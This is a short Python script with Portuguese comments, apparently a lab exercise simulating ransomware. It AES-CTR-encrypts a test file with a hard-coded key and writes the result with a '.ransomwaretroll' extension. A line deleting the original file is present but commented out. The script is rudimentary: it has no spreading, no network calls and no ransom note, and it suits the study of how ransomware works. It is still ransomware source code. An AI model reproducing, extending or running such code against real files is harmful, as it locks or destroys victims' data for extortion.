import os
import pyaes


key = b'testeransomwares'
counter = pyaes.Counter(initial_value=100)

# Crie uma instância de AESModeOfOperationCTR com a chave e o contador
aes = pyaes.AESModeOfOperationCTR(key, counter=counter)


#abrir o arquivo a ser criptografado
file_name = 'C:\\kali\\teste.txt'
#file_name ='teste.txt'
file = open(file_name,'rb')
file_data = file.read()
file.close()
#remover o arquivo original
#os.remove(file_name)
# definindo a chave de encriptação
#key = b"testeransomwares"
#aes = pyaes.AESModeOperationCTR(key)
#criptografar o arquivo
crypto_data = aes.encrypt(file_data)
#salvar o arquivo cryptografado
new_file = file_name + '.ransomwaretroll'
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()